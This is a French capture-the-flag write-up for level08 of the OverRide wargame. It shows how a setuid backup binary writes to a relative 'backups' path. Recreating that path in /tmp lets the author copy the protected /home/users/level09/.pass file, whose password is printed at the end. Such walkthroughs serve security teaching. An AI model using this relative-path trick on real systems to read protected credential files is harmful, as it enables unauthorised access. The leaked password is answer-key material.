En desassemblant le code et en testant le binaire on voit que le binaire fais une sauvegarde du fichier passé en parametre dans un dossier qui s'appelle backups.

En listant le dossier on voit un log

```bash
level08@OverRide:~$ ls
backups  level08
level08@OverRide:~$ cd backups/
level08@OverRide:~/backups$ ls
level08@OverRide:~/backups$ ls-la
ls-la: command not found
level08@OverRide:~/backups$ ls -la
total 4
drwxrwx---+ 1 level09 users    60 Oct 19  2016 .
dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
-rwxrwx---+ 1 level09 users    49 Dec  4 11:08 .log
level08@OverRide:~/backups$ cat .log
LOG: Starting back up: /home/users/level09/.pass
level08@OverRide:~/backups$
```

Le soucis c'est que l'on ne peux pas lire dans le home level09.

Gdb nous indique que le dossier backups de sauvegarde est un chemin relatif.

On peux recréer le meme environnement dans tmp (Le seul ndroit ou on peux réecrire) pour récuperer le fichier.

```bash
level08@OverRide:~/backups$ cd /tmp/
level08@OverRide:/tmp$ ls
a.out  hello.asm  level01  level03.py  level04.txt  level05.txt  ok.c  payload  sc.asm
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ls
a.out    hello.asm  level03.py   level05.txt  payload
backups  level01    level04.txt  ok.c         sc.asm
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cd backups/
level08@OverRide:/tmp/backups$ ls
home
level08@OverRide:/tmp/backups$ cd home/
level08@OverRide:/tmp/backups/home$ ls
users
level08@OverRide:/tmp/backups/home$ cd users/
level08@OverRide:/tmp/backups/home/users$ ls
level09
level08@OverRide:/tmp/backups/home/users$ cd level09/
level08@OverRide:/tmp/backups/home/users/level09$ ls
level08@OverRide:/tmp/backups/home/users/level09$ ls -la
total 4
drwxrwxr-x 2 level08 level08 60 Dec  4 11:23 .
drwxrwxr-x 3 level08 level08 60 Dec  4 11:22 ..
-rw-rw---- 1 level09 users   41 Dec  4 11:23 .pass
level08@OverRide:/tmp/backups/home/users/level09$ cat .pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
